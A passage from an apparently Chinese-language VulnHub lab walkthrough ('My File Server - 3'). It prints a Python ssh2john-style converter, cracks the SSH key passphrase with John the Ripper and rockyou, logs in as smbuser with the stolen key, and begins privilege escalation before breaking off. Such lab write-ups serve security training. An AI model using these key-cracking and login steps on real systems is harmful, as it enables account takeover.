Through the magic of python, this factory method will</span></span><br><span class="line"><span class="string">        exist in all subclasses of PKey (such as L&#123;RSAKey&#125; or L&#123;DSSKey&#125;), but</span></span><br><span class="line"><span class="string">        is useless on the abstract PKey class.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @param filename: name of the file to read</span></span><br><span class="line"><span class="string">        @type filename: str</span></span><br><span class="line"><span class="string">        @param password: an optional password to use to decrypt the key file,</span></span><br><span class="line"><span class="string">            if it&#x27;s encrypted</span></span><br><span class="line"><span class="string">        @type password: str</span></span><br><span class="line"><span class="string">        @return: a new key object based on the given private key</span></span><br><span class="line"><span class="string">        @rtype: L&#123;PKey&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @raise IOError: if there was an error reading the file</span></span><br><span class="line"><span class="string">        @raise PasswordRequiredException: if the private key file is</span></span><br><span class="line"><span class="string">            encrypted, and C&#123;password&#125; is C&#123;None&#125;</span></span><br><span class="line"><span class="string">        @raise SSHException: if the key file is invalid</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        key = cls(filename=filename, password=password)</span><br><span class="line">        <span class="keyword">return</span> key</span><br><span class="line">    from_private_key_file = classmethod(from_private_key_file)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">from_private_key</span>(<span class="params">cls, file_obj, password=None</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Create a key object by reading a private key from a file (or file-like)</span></span><br><span class="line"><span class="string">        object.  If the private key is encrypted and C&#123;password&#125; is not C&#123;None&#125;,</span></span><br><span class="line"><span class="string">        the given password will be used to decrypt the key (otherwise</span></span><br><span class="line"><span class="string">        L&#123;PasswordRequiredException&#125; is thrown).</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @param file_obj: the file to read from</span></span><br><span class="line"><span class="string">        @type file_obj: file</span></span><br><span class="line"><span class="string">        @param password: an optional password to use to decrypt the key, if it&#x27;s</span></span><br><span class="line"><span class="string">            encrypted</span></span><br><span class="line"><span class="string">        @type password: str</span></span><br><span class="line"><span class="string">        @return: a new key object based on the given private key</span></span><br><span class="line"><span class="string">        @rtype: L&#123;PKey&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @raise IOError: if there was an error reading the key</span></span><br><span class="line"><span class="string">        @raise PasswordRequiredException: if the private key file is encrypted,</span></span><br><span class="line"><span class="string">            and C&#123;password&#125; is C&#123;None&#125;</span></span><br><span class="line"><span class="string">        @raise SSHException: if the key file is invalid</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        key = cls(file_obj=file_obj, password=password)</span><br><span class="line">        <span class="keyword">return</span> key</span><br><span class="line">    from_private_key = classmethod(from_private_key)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_read_private_key_file</span>(<span class="params">self, tag, filename, password=None</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Read an SSH2-format private key file, looking for a string of the type</span></span><br><span class="line"><span class="string">        C&#123;&quot;BEGIN xxx PRIVATE KEY&quot;&#125; for some C&#123;xxx&#125;, base64-decode the text we</span></span><br><span class="line"><span class="string">        find, and return it as a string.  If the private key is encrypted and</span></span><br><span class="line"><span class="string">        C&#123;password&#125; is not C&#123;None&#125;, the given password will be used to decrypt</span></span><br><span class="line"><span class="string">        the key (otherwise L&#123;PasswordRequiredException&#125; is thrown).</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @param tag: C&#123;&quot;RSA&quot;&#125; or C&#123;&quot;DSA&quot;&#125;, the tag used to mark the data block.</span></span><br><span class="line"><span class="string">        @type tag: str</span></span><br><span class="line"><span class="string">        @param filename: name of the file to read.</span></span><br><span class="line"><span class="string">        @type filename: str</span></span><br><span class="line"><span class="string">        @param password: an optional password to use to decrypt the key file,</span></span><br><span class="line"><span class="string">            if it&#x27;s encrypted.</span></span><br><span class="line"><span class="string">        @type password: str</span></span><br><span class="line"><span class="string">        @return: data blob that makes up the private key.</span></span><br><span class="line"><span class="string">        @rtype: str</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @raise IOError: if there was an error reading the file.</span></span><br><span class="line"><span class="string">        @raise PasswordRequiredException: if the private key file is</span></span><br><span class="line"><span class="string">            encrypted, and C&#123;password&#125; is C&#123;None&#125;.</span></span><br><span class="line"><span class="string">        @raise SSHException: if the key file is invalid.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            f = open(filename, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> IOError:</span><br><span class="line">            e = sys.exc_info()[<span class="number">1</span>]</span><br><span class="line">            sys.stdout.write(<span class="string">&quot;%s\n&quot;</span> % str(e))</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        data = self._read_private_key(tag, f, password)</span><br><span class="line">        f.close()</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_read_private_key</span>(<span class="params">self, tag, f, password=None</span>):</span></span><br><span class="line">        lines = f.readlines()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;BEGIN RSA PRIVATE&quot;</span> <span class="keyword">in</span> lines[<span class="number">0</span>]:</span><br><span class="line">            tag = <span class="string">&quot;RSA&quot;</span></span><br><span class="line">            self.type = <span class="number">0</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;-----BEGIN OPENSSH PRIVATE KEY-----&quot;</span> <span class="keyword">in</span> lines[<span class="number">0</span>]:</span><br><span class="line">            <span class="comment"># new private key format for OpenSSH (automatically enabled for</span></span><br><span class="line">            <span class="comment"># keys using ed25519 signatures), ed25519 stuff is not supported</span></span><br><span class="line">            <span class="comment"># yet!</span></span><br><span class="line">            self.type = <span class="number">2</span>  <span class="comment"># bcrypt pbkdf + aes-256-cbc</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.type = <span class="number">1</span></span><br><span class="line">            tag = <span class="string">&quot;DSA&quot;</span></span><br><span class="line"></span><br><span class="line">        start = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> (start &lt; len(lines)) <span class="keyword">and</span> ((lines[start].strip() != <span class="string">&#x27;-----BEGIN &#x27;</span> + tag + <span class="string">&#x27; PRIVATE KEY-----&#x27;</span>) <span class="keyword">and</span> (lines[start].strip() != <span class="string">&#x27;-----BEGIN OPENSSH PRIVATE KEY-----&#x27;</span>)):</span><br><span class="line">            start += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> start &gt;= len(lines):</span><br><span class="line">            sys.stdout.write(<span class="string">&quot;%s is not a valid private key file\n&quot;</span> % f.name)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="comment"># parse any headers first</span></span><br><span class="line">        headers = &#123;&#125;</span><br><span class="line">        start += <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> start &lt; len(lines):</span><br><span class="line">            l = lines[start].split(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> len(l) == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            headers[l[<span class="number">0</span>].lower()] = l[<span class="number">1</span>].strip()</span><br><span class="line">            start += <span class="number">1</span></span><br><span class="line">        <span class="comment"># find end</span></span><br><span class="line">        end = start</span><br><span class="line">        <span class="keyword">while</span> ((lines[end].strip() != <span class="string">&#x27;-----END OPENSSH PRIVATE KEY-----&#x27;</span>) <span class="keyword">and</span> (lines[end].strip() != <span class="string">&#x27;-----END &#x27;</span> + tag + <span class="string">&#x27; PRIVATE KEY-----&#x27;</span>)) <span class="keyword">and</span> (end &lt; len(lines)):</span><br><span class="line">            end += <span class="number">1</span></span><br><span class="line">        <span class="comment"># if we trudged to the end of the file, just try to cope.</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = <span class="string">&#x27;&#x27;</span>.join(lines[start:end]).encode()</span><br><span class="line">            data = base64.decodestring(data)</span><br><span class="line">        <span class="keyword">except</span> base64.binascii.Error:</span><br><span class="line">            e = sys.exc_info()[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">raise</span> SSHException(<span class="string">&#x27;base64 decoding error: &#x27;</span> + str(e))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;proc-type&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> headers <span class="keyword">and</span> self.type != <span class="number">2</span>:</span><br><span class="line">            <span class="comment"># unencryped: done</span></span><br><span class="line">            sys.stderr.write(<span class="string">&quot;%s has no password!\n&quot;</span> % f.name)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="comment"># encrypted keyfile: will need a password</span></span><br><span class="line">        <span class="keyword">if</span> self.type != <span class="number">2</span> <span class="keyword">and</span> headers[<span class="string">&#x27;proc-type&#x27;</span>] != <span class="string">&#x27;4,ENCRYPTED&#x27;</span>:</span><br><span class="line">            <span class="keyword">raise</span> SSHException(<span class="string">&#x27;Unknown private key structure &quot;%s&quot;&#x27;</span> % headers[<span class="string">&#x27;proc-type&#x27;</span>])</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            encryption_type, saltstr = headers[<span class="string">&#x27;dek-info&#x27;</span>].split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">if</span> self.type != <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">raise</span> SSHException(<span class="string">&#x27;Can\&#x27;t parse DEK-info in private key file&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                encryption_type = <span class="string">&quot;AES-256-CBC&quot;</span></span><br><span class="line">                saltstr = <span class="string">&quot;fefe&quot;</span></span><br><span class="line">        <span class="keyword">if</span> encryption_type <span class="keyword">not</span> <span class="keyword">in</span> self._CIPHER_TABLE:</span><br><span class="line">            <span class="keyword">raise</span> SSHException(<span class="string">&#x27;Unknown private key cipher &quot;%s&quot;&#x27;</span> % encryption_type)</span><br><span class="line">        <span class="comment"># if no password was passed in, raise an exception pointing out that we need one</span></span><br><span class="line">        <span class="keyword">if</span> password <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">raise</span> PasswordRequiredException(<span class="string">&#x27;Private key file is encrypted&#x27;</span>)</span><br><span class="line">        cipher = self._CIPHER_TABLE[encryption_type][<span class="string">&#x27;cipher&#x27;</span>]</span><br><span class="line">        keysize = self._CIPHER_TABLE[encryption_type][<span class="string">&#x27;keysize&#x27;</span>]</span><br><span class="line">        mode = self._CIPHER_TABLE[encryption_type][<span class="string">&#x27;mode&#x27;</span>]</span><br><span class="line">        salt = unhexlify(saltstr)</span><br><span class="line">        <span class="keyword">if</span> self.type == <span class="number">2</span>:</span><br><span class="line">            salt_offset = <span class="number">47</span>  <span class="comment"># XXX is this fixed?</span></span><br><span class="line">            salt_length = <span class="number">16</span></span><br><span class="line">            saltstr = data[salt_offset:salt_offset+salt_length].encode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">        data = binascii.hexlify(data).decode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> keysize == <span class="number">24</span>:</span><br><span class="line">            self.hashline = <span class="string">&quot;%s:$sshng$%s$%s$%s$%s$%s&quot;</span> % (f.name, <span class="number">0</span>,</span><br><span class="line">                len(salt), saltstr, len(data) // <span class="number">2</span>, data)</span><br><span class="line">        <span class="keyword">elif</span> keysize == <span class="number">16</span>:</span><br><span class="line">            self.hashline = <span class="string">&quot;%s:$sshng$%s$%s$%s$%s$%s&quot;</span> % (f.name, <span class="number">1</span>, len(saltstr) // <span class="number">2</span>,</span><br><span class="line">                saltstr, len(data) // <span class="number">2</span>, data)</span><br><span class="line">        <span class="keyword">elif</span> keysize == <span class="number">32</span> <span class="keyword">and</span> self.type == <span class="number">2</span>:  <span class="comment"># bcrypt pbkdf + aes-256-cbc</span></span><br><span class="line">            <span class="comment"># round value appears after salt</span></span><br><span class="line">            rounds = <span class="number">16</span></span><br><span class="line">            self.hashline = <span class="string">&quot;%s:$sshng$%s$%s$%s$%s$%s$%d&quot;</span> % (f.name, <span class="number">2</span>, len(saltstr) // <span class="number">2</span>,</span><br><span class="line">                saltstr, len(data) // <span class="number">2</span>, data, rounds)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            sys.stderr.write(<span class="string">&quot;%s uses unsupported cipher, please file a bug!\n&quot;</span> % f.name)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> limited:</span><br><span class="line">            key = generate_key_bytes(MD5, salt, password, keysize)</span><br><span class="line">            data = cipher.new(key, mode, salt).decrypt(data)</span><br><span class="line">            <span class="comment"># check encoding</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                d = PKCS7Encoder()</span><br><span class="line">                ddata = d.decode(data)</span><br><span class="line">                <span class="keyword">return</span> ddata</span><br><span class="line">            <span class="keyword">except</span> ValueError:  <span class="comment"># incorrect password</span></span><br><span class="line">                <span class="keyword">return</span> data</span><br><span class="line">        <span class="keyword">return</span> self.hashline  <span class="comment"># dummy value</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chunks</span>(<span class="params">l, n</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(l), n):</span><br><span class="line">        <span class="keyword">yield</span> l[i:i + n]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RSADSSKey</span> (<span class="params">PKey</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, msg=None, data=None, filename=None, password=None, vals=None, file_obj=None</span>):</span></span><br><span class="line">        self.n = <span class="literal">None</span></span><br><span class="line">        self.e = <span class="literal">None</span></span><br><span class="line">        self.d = <span class="literal">None</span></span><br><span class="line">        self.p = <span class="literal">None</span></span><br><span class="line">        self.q = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> file_obj <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            self._from_private_key(file_obj, password)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> filename <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            self._from_private_key_file(filename, password)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> vals <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            self.e, self.n = vals</span><br><span class="line">        self.size = bit_length(self.n)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__hash__</span>(<span class="params">self</span>):</span></span><br><span class="line">        h = hash(self.get_name())</span><br><span class="line">        h = h * <span class="number">37</span> + hash(self.e)</span><br><span class="line">        h = h * <span class="number">37</span> + hash(self.n)</span><br><span class="line">        <span class="keyword">return</span> hash(h)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_name</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ssh-rsa&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_bits</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.size</span><br><span class="line"></span><br><span class="line">    <span class="comment">###  internals...</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_from_private_key_file</span>(<span class="params">self, filename, password</span>):</span></span><br><span class="line">        data = self._read_private_key_file(<span class="string">&#x27;RSA&#x27;</span>, filename, password)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> limited:</span><br><span class="line">            sys.stdout.write(<span class="string">&quot;%s\n&quot;</span> % self.hashline)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> self.type == <span class="number">0</span>:</span><br><span class="line">                self._decode_key(data)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self._decode_dss_key(data)</span><br><span class="line">            sys.stderr.write(<span class="string">&quot;%s has no password!\n&quot;</span> % filename)</span><br><span class="line">        <span class="keyword">except</span> SSHException:</span><br><span class="line">            sys.stdout.write(<span class="string">&quot;%s\n&quot;</span> % self.hashline)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_from_private_key</span>(<span class="params">self, file_obj, password</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;used for converting older format hashes&quot;&quot;&quot;</span></span><br><span class="line">        data = self._read_private_key(<span class="string">&#x27;RSA&#x27;</span>, file_obj, password)</span><br><span class="line">        <span class="keyword">if</span> limited:</span><br><span class="line">            sys.stdout.write(<span class="string">&quot;%s\n&quot;</span> % self.hashline)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> self.type == <span class="number">0</span>:</span><br><span class="line">                self._decode_key(data)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self._decode_dss_key(data)</span><br><span class="line">            sys.stderr.write(<span class="string">&quot;%s has no password!\n&quot;</span> % file_obj.name)</span><br><span class="line">        <span class="keyword">except</span> SSHException:</span><br><span class="line">            sys.stdout.write(<span class="string">&quot;%s\n&quot;</span> % self.hashline)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_decode_key</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        <span class="comment"># private key file contains:</span></span><br><span class="line">        <span class="comment"># RSAPrivateKey = &#123; version = 0, n, e, d, p, q, d mod p-1, d mod q-1, q**-1 mod p &#125;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            keylist = BER(data).decode()</span><br><span class="line">        <span class="keyword">except</span> BERException:</span><br><span class="line">            <span class="keyword">raise</span> SSHException(<span class="string">&#x27;Unable to parse key file&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> (type(keylist) <span class="keyword">is</span> <span class="keyword">not</span> list) <span class="keyword">or</span> (len(keylist) &lt; <span class="number">4</span>) <span class="keyword">or</span> (keylist[<span class="number">0</span>] != <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">raise</span> SSHException(<span class="string">&#x27;Not a valid RSA private key file (bad ber encoding)&#x27;</span>)</span><br><span class="line">        self.n = keylist[<span class="number">1</span>]</span><br><span class="line">        self.e = keylist[<span class="number">2</span>]</span><br><span class="line">        self.d = keylist[<span class="number">3</span>]</span><br><span class="line">        <span class="comment"># not really needed</span></span><br><span class="line">        self.p = keylist[<span class="number">4</span>]</span><br><span class="line">        self.q = keylist[<span class="number">5</span>]</span><br><span class="line">        self.size = bit_length(self.n)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_decode_dss_key</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        <span class="comment"># private key file contains:</span></span><br><span class="line">        <span class="comment"># DSAPrivateKey = &#123; version = 0, p, q, g, y, x &#125;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            keylist = BER(data).decode()</span><br><span class="line">        <span class="keyword">except</span> BERException:</span><br><span class="line">            e = sys.exc_info()[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">raise</span> SSHException(<span class="string">&#x27;Unable to parse key file: &#x27;</span> + str(e))</span><br><span class="line">        <span class="keyword">if</span> (type(keylist) <span class="keyword">is</span> <span class="keyword">not</span> list) <span class="keyword">or</span> (len(keylist) &lt; <span class="number">6</span>) <span class="keyword">or</span> \</span><br><span class="line">                (keylist[<span class="number">0</span>] != <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">raise</span> SSHException(<span class="string">&#x27;not a valid DSA private key file (bad ber encoding)&#x27;</span>)</span><br><span class="line">        self.p = keylist[<span class="number">1</span>]</span><br><span class="line">        self.q = keylist[<span class="number">2</span>]</span><br><span class="line">        self.g = keylist[<span class="number">3</span>]</span><br><span class="line">        self.y = keylist[<span class="number">4</span>]</span><br><span class="line">        self.x = keylist[<span class="number">5</span>]</span><br><span class="line">        self.size = bit_length(self.p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># PKCS7Encoder is borrowed from http://japrogbits.blogspot.in/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PKCS7Encoder</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    RFC 2315: PKCS#7 page 21</span></span><br><span class="line"><span class="string">    Some content-encryption algorithms assume the</span></span><br><span class="line"><span class="string">    input length is a multiple of k octets, where k &gt; 1, and</span></span><br><span class="line"><span class="string">    let the application define a method for handling inputs</span></span><br><span class="line"><span class="string">    whose lengths are not a multiple of k octets. For such</span></span><br><span class="line"><span class="string">    algorithms, the method shall be to pad the input at the</span></span><br><span class="line"><span class="string">    trailing end with k - (l mod k) octets all having value k -</span></span><br><span class="line"><span class="string">    (l mod k), where l is the length of the input. In other</span></span><br><span class="line"><span class="string">    words, the input is padded at the trailing end with one of</span></span><br><span class="line"><span class="string">    the following strings:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">             01 -- if l mod k = k-1</span></span><br><span class="line"><span class="string">            02 02 -- if l mod k = k-2</span></span><br><span class="line"><span class="string">                        .</span></span><br><span class="line"><span class="string">                        .</span></span><br><span class="line"><span class="string">                        .</span></span><br><span class="line"><span class="string">          k k ... k k -- if l mod k = 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The padding can be removed unambiguously since all input is</span></span><br><span class="line"><span class="string">    padded and no padding string is a suffix of another. This</span></span><br><span class="line"><span class="string">    padding method is well-defined if and only if k &lt; 256;</span></span><br><span class="line"><span class="string">    methods for larger k are an open issue for further study.</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, k=<span class="number">16</span></span>):</span></span><br><span class="line">        self.k = k</span><br><span class="line"></span><br><span class="line">    <span class="comment">## @param text The padded text for which the padding is to be removed.</span></span><br><span class="line">    <span class="comment"># @exception ValueError Raised when the input padding is missing or corrupt.</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">self, text</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Remove the PKCS#7 padding from a text string</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        nl = len(text)</span><br><span class="line">        val = int(binascii.hexlify(text[<span class="number">-1</span>]), <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> val &gt; self.k:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Input is not padded or padding is corrupt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        l = nl - val</span><br><span class="line">        <span class="keyword">return</span> text[:l]</span><br><span class="line"></span><br><span class="line">    <span class="comment">## @param text The text to encode.</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">self, text</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Pad an input string according to PKCS#7</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        l = len(text)</span><br><span class="line">        output = StringIO()</span><br><span class="line">        val = self.k - (l % self.k)</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(val):</span><br><span class="line">            output.write(<span class="string">&#x27;%02x&#x27;</span> % val)</span><br><span class="line">        <span class="keyword">return</span> text + binascii.unhexlify(output.getvalue())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        sys.stdout.write(<span class="string">&quot;Usage: %s &lt; RSA/DSA private key files &gt;\n&quot;</span> % \</span><br><span class="line">                sys.argv[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> sys.argv[<span class="number">1</span>:]:</span><br><span class="line">        key = RSADSSKey.from_private_key_file(filename, <span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>破解得到密码为password</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/ck00# vim ssh2john.py</span><br><span class="line">root@JIYE:~/vulnhub/ck00# </span><br><span class="line">root@JIYE:~/vulnhub/ck00# chmod +x ssh2john.py </span><br><span class="line">root@JIYE:~/vulnhub/ck00# ./ssh2john.py id_rsa &gt; id.hash</span><br><span class="line">root@JIYE:~/vulnhub/ck00# ls</span><br><span class="line">id.hash  id_rsa  nmap.CVT  nmap.sP  ssh2john.py  sshd_config</span><br><span class="line">root@JIYE:~/vulnhub/ck00# john id</span><br><span class="line">id.hash  id_rsa   </span><br><span class="line">root@JIYE:~/vulnhub/ck00# john id.hash --wordlist=/usr/share/wordlists/rockyou.txt </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])</span><br><span class="line">Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes</span><br><span class="line">Cost 2 (iteration count) is 1 for all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Note: This format may emit false positives, so it will keep trying even after</span><br><span class="line">finding a possible candidate.</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">password         (id_rsa)</span><br><span class="line">Warning: Only 2 candidates left, minimum 4 needed for performance.</span><br><span class="line">1g 0:00:00:03 DONE (2020-09-25 20:47) 0.2754g/s 3950Kp/s 3950Kc/s 3950KC/sa6_123..*7¡Vamos!</span><br><span class="line">Session completed</span><br><span class="line">root@JIYE:~/vulnhub/ck00#</span><br></pre></td></tr></table></figure><h2 id="0x09-登入"><a href="#0x09-登入" class="headerlink" title="0x09.登入"></a>0x09.登入</h2><p><code>修改id_rsa权限为600</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~&#x2F;vulnhub&#x2F;ck00# chmod 600 id_rsa </span><br><span class="line">root@JIYE:~&#x2F;vulnhub&#x2F;ck00# ssh -i id_rsa smbuser@192.168.1.14</span><br><span class="line">load pubkey &quot;id_rsa&quot;: invalid format</span><br><span class="line"></span><br><span class="line">   ##############################################################################################</span><br><span class="line">   #                                      InfoSec Warrior                                       #</span><br><span class="line">   #                         --------- www.InfoSecWarrior.com ------------                      #</span><br><span class="line">   #                                    My File Server - 3                                      #</span><br><span class="line">   #                        Just a simple addition to the problem                               #</span><br><span class="line">   #                               Designed By :- CyberKnight                                   #</span><br><span class="line">   #                                Twitter    :- @CyberKnight00                                #</span><br><span class="line">   ##############################################################################################</span><br><span class="line"></span><br><span class="line">Enter passphrase for key &#39;id_rsa&#39;: </span><br><span class="line">Last login: Thu Mar 19 10:15:35 2020 from 192.168.56.1</span><br><span class="line">[smbuser@fileserver ~]$ whoami</span><br><span class="line">smbuser</span><br><span class="line">[smbuser@fileserver ~]$</span><br></pre></td></tr></table></figure><h2 id="0x10-提权"><a href="#0x10-提权" class="headerlink" title="0x10.提权"></a>0x10.提权</h2><p><code>查看用户，有一个bla</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[smbuser@fileserver bin]$ cd /home</span><br><span class="line">[smbuser@fileserver home]$ ls</span><br><span class="line">bla  smbuser</span><br><span class="line">[smbuser@fileserver 